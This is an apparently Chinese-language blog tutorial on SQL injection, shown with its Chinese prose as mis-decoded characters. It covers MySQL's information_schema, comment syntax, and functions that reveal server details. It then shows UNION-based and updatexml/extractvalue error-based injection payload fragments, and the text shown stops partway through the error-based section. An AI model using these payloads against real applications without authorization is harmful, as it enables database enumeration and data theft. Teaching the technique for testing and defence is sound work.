<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="SQLæ³¨å…¥, çˆ±æ„">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>SQLæ³¨å…¥ | çˆ±æ„</title>
    <link rel="icon" type="image/jpeg" href="/favicon.jpg">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.2.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">çˆ±æ„</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>é¦–é¡µ</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>æ ‡ç­¾</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>åˆ†ç±»</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>å½’æ¡£</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>å…³äº</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>ç•™è¨€æ¿</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-list" style="zoom: 0.6;"></i>
      
      <span>Medias</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a target="_blank" rel="noopener" href="https://c.y.qq.com/base/fcgi-bin/u?__=MpCWb2N">
          
          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Musics</span>
        </a>
      </li>
      
      <li>
        <a target="_blank" rel="noopener" href="https://www.bilibili.com/bangumi/play/ep313199/?share_medium=web&share_source=qqzone&bbid=B10A6A9F-C26E-0125-79A7-022E57DFBEF055290infoc&ts=1661420533620">
          
          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Movies</span>
        </a>
      </li>
      
      <li>
        <a href="/books">
          
          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Books</span>
        </a>
      </li>
      
      <li>
        <a href="/galleries">
          
          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Galleries</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="æœç´¢" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">çˆ±æ„</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			é¦–é¡µ
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			æ ‡ç­¾
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			åˆ†ç±»
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			å½’æ¡£
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			å…³äº
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			ç•™è¨€æ¿
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-list"></i>
			
			Medias
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a target="_blank" rel="noopener" href="https://c.y.qq.com/base/fcgi-bin/u?__=MpCWb2N " style="margin-left:75px">
				  
				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
			      
		          <span>Musics</span>
                  </a>
                </li>
              
                <li>

                  <a target="_blank" rel="noopener" href="https://www.bilibili.com/bangumi/play/ep313199/?share_medium=web&share_source=qqzone&bbid=B10A6A9F-C26E-0125-79A7-022E57DFBEF055290infoc&ts=1661420533620 " style="margin-left:75px">
				  
				   <i class="fa fas fa-film" style="position: absolute;left:50px" ></i>
			      
		          <span>Movies</span>
                  </a>
                </li>
              
                <li>

                  <a href="/books " style="margin-left:75px">
				  
				   <i class="fa fas fa-book" style="position: absolute;left:50px" ></i>
			      
		          <span>Books</span>
                  </a>
                </li>
              
                <li>

                  <a href="/galleries " style="margin-left:75px">
				  
				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
			      
		          <span>Galleries</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/lfsdlfsd-sudo/lfsdlfsd-sudo.github.io.git" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Find Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/lfsdlfsd-sudo/lfsdlfsd-sudo.github.io.git" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Find Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">SQLæ³¨å…¥</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">æ— æ ‡ç­¾</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>å‘å¸ƒæ—¥æœŸ:&nbsp;&nbsp;
                    2022-08-25
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>æ›´æ–°æ—¥æœŸ:&nbsp;&nbsp;
                    2022-08-25
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>æ–‡ç« å­—æ•°:&nbsp;&nbsp;
                    9.8k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>é˜…è¯»æ—¶é•¿:&nbsp;&nbsp;
                    42 åˆ†
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>é˜…è¯»æ¬¡æ•°:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="Iã€æ•°æ®åº“åŸºç¡€"><a href="#Iã€æ•°æ®åº“åŸºç¡€" class="headerlink" title="Iã€æ•°æ®åº“åŸºç¡€"></a>Iã€æ•°æ®åº“åŸºç¡€</h1><p><code>æ•°æ®åº“ç³»ç»Ÿï¼ˆDatabase Systemï¼‰</code> æ•°æ®åº“ç³»ç»Ÿï¼ˆDBSï¼‰åŒ…æ‹¬äº†æ•°æ®åº“ï¼ˆDBï¼‰å’Œæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰</p>
<p><code>æ•°æ®åº“ï¼ˆDatabaseï¼‰</code>æ˜¯æŒ‰ç…§æ•°æ®ç»“æ„æ¥ç»„ç»‡ã€å­˜å‚¨çš„ä»“åº“</p>
<p><code>æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDatabase Manage Systemï¼‰</code>æ˜¯ç”¨äºç®¡ç†æ•°æ®åº“çš„ç³»ç»Ÿ</p>
<p>å…³ç³»å‹æ•°æ®åº“æ˜¯é‡‡ç”¨äº†å…³ç³»æ¨¡å‹æ¥ç»„ç»‡æ•°æ®çš„æ•°æ®åº“ï¼Œç®€å•çš„æ¥è¯´ï¼Œå°±æ˜¯äºŒç»´è¡¨æ ¼æ¨¡å‹ã€‚</p>
<p>å¯ä»¥ä»¥<code>Excel</code>è¡¨æ ¼æ¥åšä¸€ä¸ªç†è§£</p>
<ul>
<li>æ•°æ®ä»¥è¡¨æ ¼çš„å½¢å¼å‡ºç°</li>
<li>æ¯ä¸€è¡Œä¸ºå„ç§è®°å½•çš„åç§°</li>
<li>æ¯ä¸€åˆ—ä¸ºè®°å½•åç§°å¯¹åº”çš„æ•°æ®åŸŸ</li>
<li>è®¸å¤šè¡Œå’Œåˆ—ç»„æˆäº†ä¸€å¼ è¡¨å•</li>
<li>è‹¥å¹²çš„è¡¨å•ç»„æˆDatabase</li>
</ul>
<h2 id="æ•°æ®åº“ç®¡ç†å·¥å…·"><a href="#æ•°æ®åº“ç®¡ç†å·¥å…·" class="headerlink" title="æ•°æ®åº“ç®¡ç†å·¥å…·"></a>æ•°æ®åº“ç®¡ç†å·¥å…·</h2><ul>
<li><strong>Navicat</strong></li>
<li><strong>phpMyAdmin</strong></li>
</ul>
<h1 id="IIã€MysqlåŸºç¡€"><a href="#IIã€MysqlåŸºç¡€" class="headerlink" title="IIã€MysqlåŸºç¡€"></a>IIã€MysqlåŸºç¡€</h1><p>åœ¨å­¦ä¹ SQLæ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å¯¹Mysqlæœ‰ä¸€å®šçš„äº†è§£ï¼Œ</p>
<h2 id="ä¸€ã€information-schema"><a href="#ä¸€ã€information-schema" class="headerlink" title="ä¸€ã€information_schema"></a>ä¸€ã€information_schema</h2><p><code>Information_schema</code>æ•°æ®åº“æ˜¯MySQLè‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼</p>
<p><code>å…ƒæ•°æ®</code>æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åã€è¡¨åã€åˆ—åå’Œæ•°æ®ç±»å‹ã€è®¿é—®æƒé™ã€‚è¿™äº›ä¿¡æ¯ä¹Ÿå¯ä»¥å«<code>æ•°æ®è¯å…¸</code> </p>
<p>åœ¨MySQLä¸­ï¼ŒæŠŠ<code>information_schema</code>çœ‹ä½œæ˜¯ä¸€ä¸ªä¿¡æ¯æ•°æ®åº“ï¼Œå…¶ä¸­ä¿å­˜ç€æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ•°æ®åº“åã€è¡¨åã€åˆ—åç­‰â€¦â€¦.</p>
<p>information_schemaä¸­éƒ¨åˆ†æ•°æ®è¡¨åŠå­—æ®µï¼š</p>
<p><strong>SCHEMATA</strong>ï¼šæä¾›äº†å½“å‰MySqlå®ä¾‹ä¸­æ‰€æœ‰çš„æ•°æ®åº“ä¿¡æ¯ã€‚<code>show database</code>çš„ç»“æœå–ä¹‹æ­¤è¡¨</p>
<p><code>SELECT SCHEMA_NAME FROM information_schema.SCHEMATA</code></p>
<ul>
<li>schema_name å­—æ®µä¸ºå½“å‰æ‰€æœ‰çš„æ•°æ®åº“</li>
</ul>
<p><strong>TABLES</strong>ï¼šæä¾›äº†å…³äºæ•°æ®åº“ä¸­è¡¨çš„ä¿¡æ¯ã€‚è¯¦ç»†æè¿°äº†æŸä¸ªè¡¨å±äºå“ªä¸ªshemaç­‰ä¿¡æ¯ã€‚<code>show tables from &lt;schema_name&gt;</code>çš„ç»“æœå–ä¹‹äºæ­¤</p>
<p><code>SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=&#39;â€™</code></p>
<ul>
<li>table_schema å­—æ®µä¸ºè¡¨ä»å±çš„æ•°æ®åº“</li>
<li>table_name å­—æ®µä¸ºè¡¨å</li>
</ul>
<p><strong>COLUMNS</strong>ï¼š  æä¾›æ•°æ®åº“ä¸­è¡¨å’Œåˆ—çš„ä¿¡æ¯ã€‚è¯¦ç»†æè¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ— åŠæ¯åˆ—çš„ä¿¡æ¯ã€‚<code>show columns from &lt;schema_name&gt;.&lt;table_name&gt;</code>çš„ç»“æœå–ä¹‹æ­¤è¡¨</p>
<p><code>SELECT TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME from information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;&lt;schema_name&gt;â€™</code></p>
<ul>
<li>table_schema å­—æ®µä¸º</li>
<li>table_name å­—æ®µä¸ºè¡¨å</li>
<li>column_name å­—æ®µä¸ºåˆ—å</li>
</ul>
<h2 id="äºŒã€æ³¨é‡Š"><a href="#äºŒã€æ³¨é‡Š" class="headerlink" title="äºŒã€æ³¨é‡Š"></a>äºŒã€æ³¨é‡Š</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># # å•è¡Œæ³¨é‡Š</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users # è¿™æ˜¯ä¸€ä¸ªå•è¡Œæ³¨é‡Š</span><br><span class="line"></span><br><span class="line"># <span class="comment">-- æ³¨é‡Šï¼ˆæ ã€æ ã€ç©ºæ ¼ï¼‰</span></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users <span class="comment">-- è¿™æ˜¯ä¸€ä¸ªå•è¡Œæ³¨é‡Š</span></span><br><span class="line"></span><br><span class="line"># <span class="comment">/* */</span> è¿™æ˜¯ä¸€ä¸ªå¤šè¡Œæ³¨é‡Š</span><br><span class="line"><span class="comment">/*è¿™æ˜¯ä¸€ä¸ª</span></span><br><span class="line"><span class="comment">å¤šè¡Œæ³¨é‡Š*/</span></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>

<h2 id="ä¸‰ã€å¸¸ç”¨å‡½æ•°"><a href="#ä¸‰ã€å¸¸ç”¨å‡½æ•°" class="headerlink" title="ä¸‰ã€å¸¸ç”¨å‡½æ•°"></a>ä¸‰ã€å¸¸ç”¨å‡½æ•°</h2><h3 id="1ã€å†…ç½®å‡½æ•°"><a href="#1ã€å†…ç½®å‡½æ•°" class="headerlink" title="1ã€å†…ç½®å‡½æ•°"></a>1ã€å†…ç½®å‡½æ•°</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹å½“å‰çš„æ•°æ®åº“</span><br><span class="line">DATABASE()</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹å½“å‰æ•°æ®åº“ç‰ˆæœ¬</span><br><span class="line">@<span class="variable">@VERSION</span> </span><br><span class="line">VERSION()</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹ç”¨æˆ·</span><br><span class="line"><span class="keyword">user</span>()                        # ç”¨æˆ·å</span><br><span class="line"><span class="built_in">current_user</span>()                # å½“å‰ç”¨æˆ·å</span><br><span class="line"><span class="built_in">system_user</span>()                 # ç³»ç»Ÿç”¨æˆ·å</span><br><span class="line"><span class="built_in">session_user</span>()                # é“¾æ¥æ•°æ®åº“çš„ç”¨æˆ·å</span><br><span class="line"></span><br><span class="line"># å†…ç½®å‡½æ•°</span><br><span class="line">@<span class="variable">@datadir</span>                     # è¯»å–æ•°æ®åº“è·¯å¾„</span><br><span class="line">@<span class="variable">@basedir</span>                     # MySQLå®‰è£…è·¯å¾„</span><br><span class="line">@<span class="variable">@version</span>_compile_os           # æ“ä½œç³»ç»Ÿ</span><br><span class="line">@<span class="variable">@secure</span>_file_priv            # æŸ¥çœ‹æ•°æ®åº“secure_file_priv çš„å‚æ•°å€¼</span><br><span class="line">@<span class="variable">@character</span>_sets_dir          # å­—ç¬¦é›†å®‰è£…ç›®å½•</span><br><span class="line">@<span class="variable">@character</span>_set_server        # å­—ç¬¦é›†ç¼–ç æ ¼å¼</span><br><span class="line">@<span class="variable">@hostname</span>;                   # æŸ¥çœ‹ä¸»æœºå</span><br></pre></td></tr></table></figure>

<h3 id="2ã€å…¶ä»–å‡½æ•°"><a href="#2ã€å…¶ä»–å‡½æ•°" class="headerlink" title="2ã€å…¶ä»–å‡½æ•°"></a>2ã€å…¶ä»–å‡½æ•°</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">concat([string],[string])  # å°†ä¸¤ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</span><br><span class="line">concat_ws([sign],[string],[string])  # å°†ä¸¤ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨ç¬¦å·æ‹¼æ¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</span><br><span class="line">group_concat([<span class="keyword">array</span>],...,[<span class="keyword">array</span>])  # å°†å¤šç»„æ•°æ®è¿›è¡Œæ‹¼æ¥ï¼Œä¸åŒè¡Œä¹‹é—´ä½¿ç”¨é€—å·è¿›è¡Œè¿æ¥</span><br><span class="line"></span><br><span class="line">limit N,M  # ç›¸å½“äº limit M <span class="keyword">offset</span> N , ä»ç¬¬ N æ¡è®°å½•å¼€å§‹, è¿”å› M æ¡è®°å½•</span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span>([string],[length])  # è¿”å›å­—ç¬¦ä¸²ä»å·¦èµ·lengthä½ </span><br><span class="line"><span class="keyword">right</span>([string],[length])</span><br><span class="line">MID([string],[position],[length])</span><br><span class="line">REVERSE([string])  # å°†å­—ç¬¦ä¸²é€†åºè¾“å‡º</span><br><span class="line"></span><br><span class="line"><span class="built_in">count</span>()  # è¿”å›æŸ¥è¯¢åˆ°çš„ç»“æœæ•°é‡</span><br></pre></td></tr></table></figure>

<h2 id="å››ã€è”åˆæŸ¥è¯¢"><a href="#å››ã€è”åˆæŸ¥è¯¢" class="headerlink" title="å››ã€è”åˆæŸ¥è¯¢"></a>å››ã€è”åˆæŸ¥è¯¢</h2><p>ä½¿ç”¨unionå­—æ®µå¯ä»¥è¿›è¡Œè”åˆæŸ¥è¯¢ï¼Œå°†å‰åä¸¤æ¬¡æŸ¥è¯¢ç»“æœæ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå‰æè¦æ±‚æ˜¯ä¸¤æ¬¡æŸ¥è¯¢çš„åˆ—æ•°è¦ç›¸åŒ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># æ­£å¸¸æŸ¥è¯¢</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> security.users</span><br><span class="line"># è”åˆæŸ¥è¯¢</span><br><span class="line"># å¯ä»¥çœ‹åˆ°æŸ¥è¯¢ç»“æœä¸­å¤šäº†ä¸€ä¸ªæ¡ç›®</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> security.users <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"># å½“å‰éƒ¨åˆ†æŸ¥è¯¢æ— ç»“æœï¼Œåéƒ¨åˆ†æŸ¥è¯¢ç»“æœå°†ä½œä¸ºç»“æœ</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> security.users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>

<h2 id="äº”ã€æŠ¥é”™æ³¨å…¥"><a href="#äº”ã€æŠ¥é”™æ³¨å…¥" class="headerlink" title="äº”ã€æŠ¥é”™æ³¨å…¥"></a>äº”ã€æŠ¥é”™æ³¨å…¥</h2><h3 id="1ã€xpathå‡½æ•°"><a href="#1ã€xpathå‡½æ•°" class="headerlink" title="1ã€xpathå‡½æ•°"></a>1ã€xpathå‡½æ•°</h3><p><code>updatexml()</code> <code>extractvalue()</code></p>
<p>åœ¨mysql 5.1ä¸­æ·»åŠ äº†å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°ï¼šupdatexmlï¼ˆï¼‰extractvalueï¼ˆï¼‰</p>
<p>è¿™ä¸¤ä¸ªå‡½æ•°çš„ä½œç”¨ç›¸åŒï¼Œç”¨ä¸€ä¸ªä¸åŒçš„ xmlæ ‡è®° åŒ¹é…å’Œæ›¿æ¢ åŸæ¥çš„ xmlå— çš„å‡½æ•°ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºç”¨äºæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„å€¼</p>
<p><code>**updatexml()**</code>å‡½æ•°ä¸­éœ€è¦ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼š</p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºstringç±»å‹ï¼Œä»£è¡¨xmlæ–‡æ¡£çš„åç§°</p>
<p>ç¬¬äºŒä¸ªå‚æ•°ä¸ºxpath_stringç±»å‹ï¼Œä»£è¡¨è·¯å¾„</p>
<p>ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºstringç±»å‹ï¼Œä»£è¡¨è¦æ›¿æ¢çš„æ•°æ®</p>
<p>æŠ¥é”™çš„å…³é”®å°±åœ¨äºç¬¬äºŒä¸ªå‚æ•°ï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°ä¸­ä¼ å…¥çš„å€¼ä¸ä¸ºxpath_stringç±»å‹çš„æ—¶å€™ï¼Œè¯¥å‡½æ•°å°±ä¼šæŠ¥é”™</p>
<figure class="highlight plaintext"><figcaption><span>JSX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username=&#x27;admin&#x27; and updatexml(1,0x7e,3)</span><br></pre></td></tr></table></figure>

<p><code>**extractvalue()**</code>å’Œupdatexml()é™¤äº†å‚æ•°æ•°é‡ä¹‹å¤–åŸºæœ¬ç›¸åŒ</p>
<p>extractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„)ï¼ŒæŠ¥é”™ç‚¹åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¸­</p>
<figure class="highlight plaintext"><figcaption><span>JSX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username=&#x27;admin&#x27; and extractvalue(1,0x7e)</span><br></pre></td></tr></table></figure>

